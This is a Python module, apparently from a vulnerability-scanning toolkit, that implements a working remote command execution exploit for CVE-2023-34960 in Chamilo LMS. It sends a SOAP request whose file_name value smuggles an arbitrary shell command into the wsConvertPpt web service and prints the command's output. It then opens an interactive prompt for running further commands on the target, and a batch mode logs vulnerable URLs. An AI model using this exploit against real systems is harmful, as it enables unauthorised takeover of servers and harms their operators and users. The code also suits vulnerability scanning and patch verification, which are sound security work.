import warnings,requests
import xml.etree.ElementTree as ET
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
warnings.filterwarnings("ignore")
class Cve_2023_34960:
    def Kill_ALL(self,url, command):
        body = f'''<?xml version="1.0" encoding="UTF-8"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{url}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{{}}`.pptx'|" |{command}||a #</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>'''
        try:
            response = requests.post('{}/main/webservices/additional_webservices.php'.format(url), data=body, headers={
                'Content-Type': 'text/xml; charset=utf-8',"User-Agent":self.headers
            }, verify = self.ssl,proxies=self.proxy,timeout = 7)
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Chamilo",e)
            return False
        if response.status_code == 200 and "wsConvertPptResponse" in response.text:
            kill = ET.fromstring(response.text)
            return_tag = kill.find('.//return')
            if return_tag is not None:
                OutPrintInfoSuc("Chamilo", f"目标存在漏洞！{url}")
                if not self.batch:
                    content = return_tag.text
                    OutPrintInfo("Chamilo", f"执行结果:")
                    OutPrintInfo("Chamilo", f"{content}")
                else:
                    OutPutFile("chamilo_2023_34960.txt",f"目标存在漏洞！{url}")

            else:
                if not self.batch:
                    OutPrintInfo("Chamilo", f"未找到执行结果，手动检查")
            return True
        else:
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        command = target["cmd"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if self.Kill_ALL(url, command):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否进行RCE利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    while True:
                        cmd = Prompt.ask("[b yellow]CMD")
                        if cmd == "exit":
                            break
                        self.Kill_ALL(url, cmd)
        else:
            if not self.batch:
                OutPrintInfo("Chamilo", f"不存在漏洞/命令执行失败: {url}")